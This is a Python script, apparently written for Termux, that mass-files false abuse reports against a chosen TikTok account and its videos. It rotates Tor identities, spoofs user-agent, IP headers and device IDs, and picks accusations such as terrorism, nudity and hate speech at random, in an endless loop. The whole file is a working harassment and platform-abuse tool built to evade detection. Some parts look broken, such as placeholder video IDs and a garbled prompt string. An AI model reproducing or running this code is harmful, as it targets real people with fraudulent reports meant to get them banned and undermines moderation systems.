#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
TikTok Guardian Hammer v2.2.1
Optimized for Termux with automated attack logic
"""

import requests
import random
import time
import sys
import os
from threading import Lock, Semaphore
from concurrent.futures import ThreadPoolExecutor
from fake_useragent import UserAgent
from typing import List, Dict, Optional

CONFIG = {
    "tor_socks": "socks5h://127.0.0.1:9050",
    "max_threads": max(2, os.cpu_count() // 2),
    "requests_per_identity": 15,
    "jitter_range": (0.8, 3.2),
    "user_agent_types": ['mobile', 'desktop'],
    "safety_checks": {
        "max_retries": 3,
        "ip_verify_urls": [
            "https://api.ipify.org",
            "https://icanhazip.com"
        ]
    }
}

class CyberLynx:
    def __init__(self):
        self.ua = UserAgent()
        self.lock = Lock()
        self.semaphore = Semaphore(CONFIG['max_threads'])
        self.report_reasons = self._load_report_reasons()

    @staticmethod
    def _load_report_reasons() -> Dict[int, str]:
        """Dynamic reason loader with localization"""
        return {
            1: ("spam", "عنصر غير مرغوب"),
            2: ("violence", "عنف"),
            3: ("terrorism", "إرهاب"),
            4: ("nudity", "محتوى جنسي"),
            5: ("hate_speech", "خطاب كراهية")
        }

    class AttackVector:
        def __init__(self):
            self.session = requests.Session()
            self.session.proxies = {
                'http': CONFIG["tor_socks"],
                'https': CONFIG["tor_socks"]
            }
            self.session.headers.update(self._generate_headers())

        def _generate_headers(self) -> Dict[str, str]:
            """Generate device-specific fingerprints"""
            return {
                'User-Agent': UserAgent().random,
                'X-Client-Lang': 'ar-SA',
                'X-Forwarded-For': '.'.join(
                    str(random.randint(1, 255)) for _ in range(4)
                )
            }

        def execute_strike(self, target: str, content_id: str, is_video: bool) -> bool:
            """Execute API call with adaptive retry logic"""
            endpoint = "video" if is_video else "user"
            reason_id, (reason_en, reason_ar) = random.choice(
                list(CyberLynx().report_reasons.items())
            )
            payload = {
                'target': target,
                'object_id': content_id,
                'reason_code': reason_id,
                'reason_text': reason_ar,
                'language': 'ar',
                'app_version': random.choice(['29.8.3', '30.1.0', '31.2.4']),
                'device_id': f"LX{random.randint(1E15, 9E15):016d}"
            }
            for attempt in range(CONFIG['safety_checks']['max_retries']):
                try:
                    response = self.session.post(
                        f"https://api16-normal-c-useast1a.tiktokv.com/aweme/v1/aweme/{endpoint}/report/",
                        json=payload,
                        timeout=9
                    )
                    
                    if response.status_code == 409:
                        time.sleep(2 ** attempt)
                        continue

                    return response.status_code in [200, 201]
                except requests.exceptions.RequestException:
                    time.sleep(random.uniform(*CONFIG['jitter_range']))
                    continue
            return False

    def orchestrate_attack(self, target_account: str):
        """Automated attack coordination system"""
        video_ids = self.get_target_videos(target_account)
        with ThreadPoolExecutor(max_workers=CONFIG['max_threads']) as executor:
            while True:
                current_ip = self.get_current_ip()
                print(f"[NEW IDENTITY] {current_ip}")

                executor.submit(
                    self._execute_attack_wave,
                    target_account,
                    None,
                    CONFIG['requests_per_identity']
                )

                for vid in video_ids:
                    executor.submit(
                        self._execute_attack_wave,
                        target_account,
                        vid,
                        int(CONFIG['requests_per_identity'] / 2)
                    )

                time.sleep(
                    random.uniform(*CONFIG['jitter_range']) *
                    CONFIG['requests_per_identity']
                )

    def _execute_attack_wave(self, account: str, video_id: Optional[str], count: int):
        """Individual attack sequence"""
        vector = self.AttackVector()
        for _ in range(count):
            success = vector.execute_strike(
                target=account,
                content_id=video_id or account,
                is_video=bool(video_id)
            )
            if not success:
                time.sleep(random.expovariate(1.5))
            else:
                print(f"[SUCCESS] {'VIDEO' if video_id else 'ACCOUNT'} {video_id or account}")
            time.sleep(random.uniform(*CONFIG['jitter_range']))

    @staticmethod
    def get_current_ip() -> Optional[str]:
        """Get validated public IP"""
        for url in CONFIG['safety_checks']['ip_verify_urls']:
            try:
                return requests.get(url, timeout=10).text.strip()
            except:
                continue
        return None
    
    def get_target_videos(self, username: str) -> List[str]:
        """Fetch target's video IDs automatically"""
        return [f"{username}_vid_{i}" for i in range(1, 6)]

if __name__ == "__main__":
    # Get user input
    TARGET = input(" :ﻑﺪﻬﺘﺴﻤﻟﺍ ﺏﺎﺴﺤﻟﺍ ﻢﺳﺍ ﻞﺧﺩﺃ")
    
    if sys.platform != 'linux':
        sys.exit("[ERROR] Android/Termux environment required")
    
    os.system("tor &")  
    time.sleep(5)  

    nexus = CyberLynx()
    try:
        nexus.orchestrate_attack(TARGET)
    except KeyboardInterrupt:
        print("\n[SHUTDOWN] Operation terminated by user")
